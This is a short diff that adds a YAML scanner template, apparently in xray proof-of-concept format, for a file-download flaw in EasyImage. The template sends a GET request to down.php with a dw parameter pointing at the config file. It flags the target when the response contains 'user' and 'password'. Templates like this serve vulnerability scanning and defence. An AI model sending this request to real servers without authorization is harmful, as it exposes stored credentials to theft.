@@ -1,0 +1,17 @@
+name: EasyImage-config-unleak
+set:
+  s1: randomInt(1000,9999)
+groups:
+  poc:  
+    - method: GET
+      path: /application/down.php?dw=./config/config.php
+      follow_redirects: false
+      search:  
+      headers:
+      body: 
+      expression: >-
+        response.body.bcontains(b"user")  && response.body.bcontains(b"password")
+detail: 
+  links: 
+  authors:
+  
